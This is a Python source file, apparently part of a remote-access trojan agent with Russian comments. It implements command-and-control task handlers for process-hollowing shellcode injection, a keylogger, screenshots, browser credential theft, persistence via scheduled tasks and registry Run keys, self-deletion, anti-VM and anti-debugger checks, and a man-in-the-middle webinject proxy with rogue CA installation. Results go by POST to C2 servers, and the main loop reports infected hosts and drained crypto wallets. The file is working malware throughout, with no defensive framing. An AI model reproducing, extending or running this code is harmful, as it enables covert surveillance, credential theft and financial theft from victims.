    def _handle_inject_shellcode(self, target_process: str, shellcode_b64: str) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду инъекции шеллкода через нативный модуль."""
        if not self.injector_lib:
            return None, "Native injector library not loaded."
            
        if platform.system() != "Windows":
            return None, "Shellcode injection via Process Hollowing is only supported on Windows."
            
        try:
            import base64
            shellcode_bytes = base64.b64decode(shellcode_b64)
            shellcode_size = len(shellcode_bytes)
            self.logger.info(f"Decoded shellcode size: {shellcode_size} bytes for injection into {target_process}")
        except Exception as e:
            self.logger.error(f"Failed to decode base64 shellcode: {e}")
            return None, f"Failed to decode base64 shellcode: {e}"
            
        if shellcode_size == 0:
             return None, "Decoded shellcode is empty."

        # Подготовка параметров для ctypes
        c_target_process = ctypes.c_char_p(target_process.encode('utf-8'))
        # Создаем изменяемый буфер для шеллкода
        c_shellcode_buffer = ctypes.create_string_buffer(shellcode_bytes, shellcode_size) 
        c_shellcode_size = ctypes.c_ulong(shellcode_size)
        # Указатель для получения сообщения об ошибке из C++
        c_error_msg_ptr = ctypes.c_char_p() 

        error_message: Optional[str] = None
        result_message: str = ""

        try:
            # Вызываем нативную функцию
            status_code = self.injector_lib.inject_process_hollowing(
                c_target_process,
                ctypes.cast(c_shellcode_buffer, ctypes.c_void_p), # Передаем как void*
                c_shellcode_size,
                ctypes.byref(c_error_msg_ptr) # Передаем указатель на указатель char*
            )

            # Проверяем результат и сообщение об ошибке
            if status_code == 0:
                result_message = f"Native injection function returned success (code {status_code})."
                self.logger.info(result_message)
            else:
                if c_error_msg_ptr and c_error_msg_ptr.value:
                     # Копируем сообщение об ошибке из C++ строки
                    error_message = c_error_msg_ptr.value.decode('utf-8', errors='replace')
                    self.logger.error(f"Native injection failed. Status: {status_code}, Error: {error_message}")
                    # Освобождаем память, выделенную в C++
                    self.injector_lib.free_error_message(c_error_msg_ptr)
                else:
                    error_message = f"Native injection function failed with code {status_code}, but no error message provided."
                    self.logger.error(error_message)
                result_message = f"Injection failed (code {status_code})."

        except Exception as e:
            self.logger.error(f"Exception during native injection call: {e}", exc_info=True)
            error_message = f"Python exception during native call: {e}"
            result_message = "Injection failed due to Python exception."
            # На всякий случай пробуем освободить память, если указатель был установлен
            if c_error_msg_ptr and c_error_msg_ptr.value and hasattr(self.injector_lib, 'free_error_message'):
                 try:
                     self.injector_lib.free_error_message(c_error_msg_ptr)
                 except Exception as free_e:
                     self.logger.warning(f"Exception while trying to free C++ error message after another exception: {free_e}")

        return result_message, error_message

    def _handle_keylogger_start(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду запуска кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."
        
        error_ptr = ctypes.c_char_p() # Указатель для получения строки ошибки
        error_msg = None
        try:
            self.logger.info("Attempting to start keylogger...")
            ret_code = self.injector_lib.StartKeylogger(ctypes.byref(error_ptr))
            if error_ptr and error_ptr.value:
                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
                # Освобождаем память, выделенную C++ для строки ошибки
                self.injector_lib.free_error_message(error_ptr)
                
            if ret_code == 0:
                self.logger.info("Keylogger started successfully.")
                return {"status": "Keylogger started"}, None
            else:
                err = f"Failed to start keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
                self.logger.error(err)
                return None, err
        except Exception as e:
            err = f"Exception calling StartKeylogger: {e}"
            self.logger.exception(err)
            return None, err

    def _handle_keylogger_stop(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду остановки кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."

        error_ptr = ctypes.c_char_p()
        error_msg = None
        try:
            self.logger.info("Attempting to stop keylogger...")
            ret_code = self.injector_lib.StopKeylogger(ctypes.byref(error_ptr))
            if error_ptr and error_ptr.value:
                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
                self.injector_lib.free_error_message(error_ptr)
            
            if ret_code == 0:
                self.logger.info("Keylogger stopped successfully.")
                return {"status": "Keylogger stopped"}, None
            else:
                err = f"Failed to stop keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
                self.logger.error(err)
                return None, err
        except Exception as e:
            err = f"Exception calling StopKeylogger: {e}"
            self.logger.exception(err)
            return None, err

    def _handle_keylogger_get_logs(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду получения логов кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."
             
        logs_ptr = None
        try:
            self.logger.info("Attempting to get keylogs...")
            logs_ptr = self.injector_lib.GetKeyLogs() # Возвращает char*
            
            if logs_ptr:
                # Декодируем строку из C (предполагаем UTF-8)
                logs_json_str = logs_ptr.decode('utf-8', errors='ignore')
                self.logger.info(f"Received keylogs string (length {len(logs_json_str)}). Attempting to parse JSON.")
                # Освобождаем память C строки *после* декодирования
                self.injector_lib.free_error_message(logs_ptr) # Используем ту же функцию освобождения
                
                try:
                    # Пытаемся распарсить JSON, чтобы убедиться в корректности
                    logs_data = json.loads(logs_json_str)
                    self.logger.info(f"Successfully parsed keylogs JSON ({len(logs_data)} entries).")
                    return {"keylogs": logs_data}, None # Возвращаем распарсенный JSON
                except json.JSONDecodeError as e:
                    err = f"Failed to parse keylogs JSON: {e}. Raw string: {logs_json_str[:200]}..."
                    self.logger.error(err)
                    # Возвращаем сырую строку, если парсинг не удался, но C2 сможет разобраться
                    return {"raw_keylogs": logs_json_str}, err 
            else:
                self.logger.info("No keylogs available.")
                return {"keylogs": []}, None # Возвращаем пустой список, если логов нет

        except Exception as e:
            err = f"Exception calling GetKeyLogs: {e}"
            self.logger.exception(err)
            # Если была ошибка и logs_ptr был получен, пытаемся освободить память
            if logs_ptr: 
                try:
                    self.injector_lib.free_error_message(logs_ptr)
                except Exception as free_e:
                     self.logger.error(f"Exception freeing logs_ptr after another error: {free_e}")
            return None, err

    def _handle_screenshot(self, params: dict = {}) -> Tuple[Optional[str], Optional[str]]:
        """Делает скриншот и возвращает его в base64."""
        # params пока не используется, но может содержать номер монитора и т.п.
        self.logger.info("Taking screenshot...")
        try:
            with mss.mss() as sct:
                # Берем первый монитор
                monitor = sct.monitors[1]
                # Снимаем скриншот
                sct_img = sct.grab(monitor)

                # Сохраняем в байтовый поток PNG
                img_bytes_io = io.BytesIO()
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=img_bytes_io)
                img_bytes = img_bytes_io.getvalue()

                # Кодируем в base64
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')
                self.logger.info(f"Screenshot taken successfully ({len(img_base64)} chars b64).")
                return img_base64, None # Возвращаем base64 строку
        except Exception as e:
            error_msg = f"Failed to take screenshot: {e}"
            self.logger.error(error_msg, exc_info=True)
            return None, error_msg

            return {"success": False, "message": error_msg}, error_msg

    def _load_injector_library(self):
        """Загружает нативную библиотеку инъекции"""
        # Определяем путь к DLL (предполагая, что она рядом с агентом)
        # Важно: Этот путь будет использоваться для самоудаления!
        dll_filename = 'libcpp_injector.dll'
        base_dir = os.path.dirname(os.path.abspath(__file__))
        # Предполагаем, что DLL лежит в src/native/
        lib_path = os.path.join(base_dir, 'native', dll_filename)
        
        # Проверяем существование файла перед загрузкой
        if not os.path.exists(lib_path):
            self.logger.error(f"Injector DLL not found at expected path: {lib_path}")
            # Попытка загрузить из текущей директории как fallback?
            alt_lib_path = os.path.abspath(dll_filename)
            if os.path.exists(alt_lib_path):
                self.logger.warning(f"DLL not found at {lib_path}, trying {alt_lib_path}")
                lib_path = alt_lib_path
            else:
                 self.logger.error(f"Cannot find {dll_filename} neither at {lib_path} nor {alt_lib_path}. Native features disabled.")
                 return None

        self.logger.info(f"Attempting to load injector library from: {lib_path}")
        self.config['_injector_dll_path'] = lib_path # Сохраняем путь для самоудаления
        try:
            # Используем полный путь для надежности
            lib = ctypes.CDLL(lib_path)
            self.logger.info(f"Successfully loaded library: {lib_path}")
            
            # --- Определяем сигнатуры для известных функций ---
            # inject_process_hollowing
            lib.inject_process_hollowing.argtypes = [ctypes.c_char_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_char_p)]
            lib.inject_process_hollowing.restype = ctypes.c_int
            
            # free_error_message
            lib.free_error_message.argtypes = [ctypes.c_char_p]
            lib.free_error_message.restype = None
            
            # IsVMEnvironmentDetected
            lib.IsVMEnvironmentDetected.argtypes = []
            lib.IsVMEnvironmentDetected.restype = ctypes.c_bool
            
            # IsDebuggerPresentDetected
            lib.IsDebuggerPresentDetected.argtypes = []
            lib.IsDebuggerPresentDetected.restype = ctypes.c_bool
            
            # Keylogger functions
            lib.StartKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
            lib.StartKeylogger.restype = ctypes.c_int
            lib.StopKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
            lib.StopKeylogger.restype = ctypes.c_int
            lib.GetKeyLogs.argtypes = []
            lib.GetKeyLogs.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти GetKeyLogs и Start/Stop

            # Screenshot functions
            lib.CaptureScreenshot.argtypes = []
            lib.CaptureScreenshot.restype = ctypes.c_char_p # Возвращает Base64 строку
            lib.FreeScreenshotData.argtypes = [ctypes.c_char_p]
            lib.FreeScreenshotData.restype = None

            # Steal Browser Credentials function
            lib.StealBrowserCredentials.argtypes = []
            lib.StealBrowserCredentials.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Scan Files Recursive function
            lib.ScanFilesRecursive.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int]
            lib.ScanFilesRecursive.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Find App Session Files function
            lib.FindAppSessionFiles.argtypes = [ctypes.c_char_p]
            lib.FindAppSessionFiles.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Persistence functions
            lib.PersistViaTaskScheduler.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
            lib.PersistViaTaskScheduler.restype = ctypes.c_int
            lib.PersistViaRegistryRunKey.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
            lib.PersistViaRegistryRunKey.restype = ctypes.c_int
            # free_error_message используется для освобождения памяти ошибок

            # Self Delete function
            lib.SelfDelete.argtypes = [ctypes.c_wchar_p]
            lib.SelfDelete.restype = ctypes.c_int
            
            return lib
        except OSError as e:
            self.logger.error(f"Failed to load injector library '{lib_path}'. OS: {platform.system()}. Error: {e}")
            # В Linux/macOS это ожидаемо, но в Windows - проблема
            if platform.system() == "Windows":
                self.logger.error("CRITICAL: Running on Windows but failed to load injector DLL!")
            return None
        except AttributeError as e:
            self.logger.error(f"Attribute error while setting up functions for library '{lib_path}'. Error: {e}")
            # Это может означать, что DLL загрузилась, но не содержит ожидаемых функций
            return None

    def _handle_persist(self, method: Optional[str], name: Optional[str], path: Optional[str], args: Optional[str]) -> Tuple[Any, Optional[str]]:
        """Обрабатывает задачу установки персистентности."""
        persist_config = self.config.get('persistence', {})
        if not persist_config.get('enabled', False):
             msg = "Persistence module is disabled by configuration."
             self.logger.warning(msg)
             return {"success": False, "message": msg}, msg

        # Используем метод из конфига по умолчанию, если не указан
        method_to_use = method if method else persist_config.get('default_method')
        # Генерируем имя, если не указано
        name_to_use = name if name else f"AgentX_{self.agent_uuid[:8]}"

        if not method_to_use:
             msg = "Persistence method not specified and no default method in config."
             self.logger.error(msg)
             return {"success": False, "message": msg}, msg

        self.logger.info(f"Attempting to enable persistence: method='{method_to_use}', name='{name_to_use}', path='{path}', args='{args}'")

        executable_path = path if path else self.executable_path
        if not executable_path:
             error_msg = "Could not determine executable path for persistence."
             self.logger.error(error_msg)
             return {"success": False, "message": error_msg}, error_msg

        # Добавляем try-except вокруг вызова менеджера
        try:
            success, message = self.persistence_manager.enable(method_to_use, name_to_use, executable_path, args)
            if success:
                self.logger.info(f"Persistence enabled successfully: {message}")
                return {"success": True, "message": message}, None
            else:
                self.logger.error(f"Failed to enable persistence: {message}")
                return {"success": False, "message": message}, message
        except Exception as e:
             msg = f"Exception enabling persistence: {e}"
             self.logger.error(msg, exc_info=True)
             return {"success": False, "message": msg}, msg

    def _send_task_result(self, task_id: Optional[str], result: Any, error: Optional[str]):
        """Отправляет результат выполнения задачи на C2 сервер."""
        if not self.agent_id:
            self.logger.warning("Agent not registered, cannot send task result.")
            return
        if not task_id:
             self.logger.warning("Missing task_id, cannot send task result.")
             return # Не можем отправить результат без ID задачи

        # Берем первый URL из списка C2 серверов
        c2_servers = self.config.get('c2_servers', [])
        if not c2_servers:
             self.logger.error("No C2 servers configured, cannot send task result.")
             return
        c2_url = c2_servers[0]

        endpoint = f"{c2_url}/task_result/{self.agent_id}/{task_id}"
        payload = {
            "result": None,
            "error": error
        }
        # ... (сериализация результата без изменений) ...
        if result is not None:
             if isinstance(result, (str, int, float, bool, list, dict)):
                 payload["result"] = result
             elif isinstance(result, bytes):
                 try:
                      payload["result"] = base64.b64encode(result).decode('utf-8')
                 except Exception as e:
                      logger.error(f"Failed to base64 encode result bytes for task {task_id}: {e}")
                      payload["error"] = (error or "") + f" | Failed to encode result bytes: {e}" # Объединяем ошибки
             else:
                 try:
                     payload["result"] = str(result)
                 except Exception as e:
                     logger.error(f"Failed to serialize result for task {task_id}: {e}")
                     payload["error"] = (error or "") + f" | Failed to serialize result: {e}" # Объединяем ошибки

        # Добавляем retry логику?
        try:
            logger.debug(f"Sending result for task {task_id} to {endpoint}")
            # Используем сессию requests для возможного keep-alive?
            response = requests.post(endpoint, json=payload, timeout=30)
            response.raise_for_status()
            logger.info(f"Successfully sent result for task {task_id}")
        except requests.exceptions.Timeout:
             logger.error(f"Timeout sending result for task {task_id} to {endpoint}")
        except requests.exceptions.ConnectionError:
             logger.error(f"Connection error sending result for task {task_id} to {endpoint}")
        except requests.exceptions.HTTPError as e:
             logger.error(f"HTTP error sending result for task {task_id} to {endpoint}: {e.response.status_code} {e.response.reason}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send result for task {task_id} to {endpoint}: {e}")
        except Exception as e:
            logger.error(f"Unexpected error sending result for task {task_id}: {e}", exc_info=True)

    def _handle_webinject_start(self, port: Optional[int], domains: Optional[List[str]]) -> Tuple[Any, Optional[str]]:
        if not self.webinject_engine:
             return None, "Webinject module is disabled or not initialized."
        
        cfg = self.config.get('webinject', {})
        port_to_use = port if port else cfg.get('mitm_port', 8080)
        domains_to_use = domains if domains is not None else cfg.get('target_domains')
        
        self.logger.info(f"Starting webinject proxy on port {port_to_use} for domains: {domains_to_use}")
        try:
             self.webinject_engine.start_proxy(port_to_use, domains_to_use)
             # <<< Устанавливаем системный прокси после запуска MITM >>>
             proxy_host = '127.0.0.1' # MITM слушает на localhost
             set_proxy_success, set_proxy_msg = self._set_system_proxy(proxy_host, port_to_use)
             if not set_proxy_success:
                  logger.warning(f"Webinject proxy started, but failed to set system proxy: {set_proxy_msg}")
             # <<< Конец установки прокси >>>
             return {"success": True, "message": f"Webinject proxy started on port {port_to_use}. System proxy setting status: {set_proxy_msg}"}, None
        except Exception as e:
             msg = f"Failed to start webinject proxy: {e}"
             self.logger.error(msg, exc_info=True)
             return {"success": False, "message": msg}, msg

    def _handle_webinject_stop(self, params: dict = {}) -> Tuple[Any, Optional[str]]:
        if not self.webinject_engine:
             return None, "Webinject module is disabled or not initialized."
        self.logger.info("Stopping webinject proxy...")
        try:
             self.webinject_engine.stop_proxy()
             # <<< Снимаем системный прокси после остановки MITM >>>
             unset_proxy_success, unset_proxy_msg = self._unset_system_proxy()
             if not unset_proxy_success:
                 logger.warning(f"Webinject proxy stopped, but failed to unset system proxy: {unset_proxy_msg}")
             # <<< Конец снятия прокси >>>
             return {"success": True, "message": f"Webinject proxy stopped. System proxy unsetting status: {unset_proxy_msg}"}, None
        except Exception as e:
             msg = f"Failed to stop webinject proxy: {e}"
             self.logger.error(msg, exc_info=True)
             return {"success": False, "message": msg}, msg

    def _handle_webinject_update(self, templates: Optional[Dict[str, str]]) -> Tuple[Any, Optional[str]]:
        if not self.webinject_engine:
             return None, "Webinject module is disabled or not initialized."
        # <<< Если templates не переданы, перезагружаем из директории >>>
        if templates is None:
             self.logger.info("Reloading webinject templates from directory...")
             templates_dir = os.path.join(self.base_path, "src/modules/webinject/templates")
             templates_to_load = load_inject_templates(templates_dir)
             if not templates_to_load:
                  msg = "No inject templates found in directory."
                  return {"success": False, "message": msg}, msg
             templates = templates_to_load # Используем загруженные
        # <<< Конец перезагрузки >>>
        
        self.logger.info(f"Updating webinject templates ({len(templates)} rules)..." )
        try:
             self.webinject_engine.update_injects(templates)
             return {"success": True, "message": "Webinject templates updated."}, None
        except Exception as e:
             msg = f"Failed to update webinject templates: {e}"
             self.logger.error(msg, exc_info=True)
             return {"success": False, "message": msg}, msg

    def _handle_webinject_install_ca(self, params: dict = {}) -> Tuple[Any, Optional[str]]:
         if not self.webinject_engine:
             return None, "Webinject module is disabled or not initialized."
         self.logger.info("Attempting to install Webinject CA certificate...")
         try:
             success = self.webinject_engine.install_ca_certificate()
             msg = "CA certificate installed successfully." if success else "CA certificate installation failed (or not implemented)."
             return {"success": success, "message": msg}, None if success else msg
         except Exception as e:
             msg = f"Error installing CA certificate: {e}"
             self.logger.error(msg, exc_info=True)
             return {"success": False, "message": msg}, msg

    # --- Управление системным прокси --- 
    def _set_system_proxy(self, host: str, port: int, bypass: Optional[List[str]] = None) -> Tuple[bool, str]:
        """Пытается установить системный HTTP/HTTPS прокси.
           MVP: Устанавливает переменные окружения для текущего процесса и дочерних.
        """
        proxy_url = f"http://{host}:{port}"
        no_proxy_str = ",".join(bypass) if bypass else "localhost,127.0.0.1"
        success = True
        message = f"System proxy variables set to {proxy_url} (bypass: {no_proxy_str}) for current process."
        errors = []

        logger.info(f"Setting system proxy environment variables: HTTP_PROXY={proxy_url}, HTTPS_PROXY={proxy_url}, NO_PROXY={no_proxy_str}")
        try:
            os.environ['HTTP_PROXY'] = proxy_url
            os.environ['HTTPS_PROXY'] = proxy_url
            os.environ['NO_PROXY'] = no_proxy_str
            # Для некоторых утилит используются lowercase переменные
            os.environ['http_proxy'] = proxy_url
            os.environ['https_proxy'] = proxy_url
            os.environ['no_proxy'] = no_proxy_str
        except Exception as e:
             err_msg = f"Failed to set environment variables: {e}"
             logger.error(err_msg)
             errors.append(err_msg)
             success = False

        # TODO: Добавить команды для Windows (netsh/reg), Linux (gsettings), macOS (networksetup)
        # Эти команды потребуют прав администратора

        final_message = message if success else " | ".join(errors)
        return success, final_message

    def _unset_system_proxy(self) -> Tuple[bool, str]:
        """Пытается снять системный HTTP/HTTPS прокси.
           MVP: Удаляет переменные окружения для текущего процесса.
        """
        success = True
        message = "System proxy environment variables unset for current process."
        errors = []
        vars_to_unset = ['HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY', 'http_proxy', 'https_proxy', 'no_proxy']

        logger.info("Unsetting system proxy environment variables...")
        for var in vars_to_unset:
            try:
                if var in os.environ:
                    del os.environ[var]
            except Exception as e:
                 err_msg = f"Failed to unset environment variable {var}: {e}"
                 logger.warning(err_msg) # Warning, т.к. отсутствие переменной не критично
                 # errors.append(err_msg) # Не считаем это фатальной ошибкой

        # TODO: Добавить команды для Windows, Linux, macOS для снятия прокси

        final_message = message # Возвращаем успех, даже если не все переменные были удалены
        return success, final_message

    def _handle_set_system_proxy(self, host: Optional[str], port: Optional[int], enabled: bool) -> Tuple[Any, Optional[str]]:
        """Обработчик задачи установки/снятия системного прокси."""
        if enabled:
            if not host or not port:
                 return None, "Missing 'host' or 'port' parameter when enabling proxy."
            self.logger.info(f"Task received to SET system proxy to {host}:{port}")
            # TODO: Получить bypass лист из конфига?
            success, msg = self._set_system_proxy(host, port)
            return {"success": success, "message": msg}, None if success else msg
        else:
            self.logger.info("Task received to UNSET system proxy.")
            success, msg = self._unset_system_proxy()
            return {"success": success, "message": msg}, None if success else msg

if __name__ == "__main__":
    # Проверяем наличие аргумента с путем к конфигурации
    config_path = sys.argv[1] if len(sys.argv) > 1 else None
    
    # Создаем и запускаем автономного агента
    agent = AutonomousAgent(config_path)
    agent.start()
    
    try:
        # Основной цикл с выводом статистики
        while True:
            time.sleep(60)
            stats = agent.get_stats()
            print(f"Runtime: {stats['runtime_readable']}, "
                  f"Scanned: {stats['scanned_hosts']}, "
                  f"Infected: {stats['infected_hosts']}, "
                  f"Wallets: {stats['detected_wallets']}, "
                  f"Drained: {stats['drained_wallets']}, "
                  f"Value: ${stats['total_drained_value']:.2f}")
    except KeyboardInterrupt:
        print("Stopping agent...")
        agent.stop() 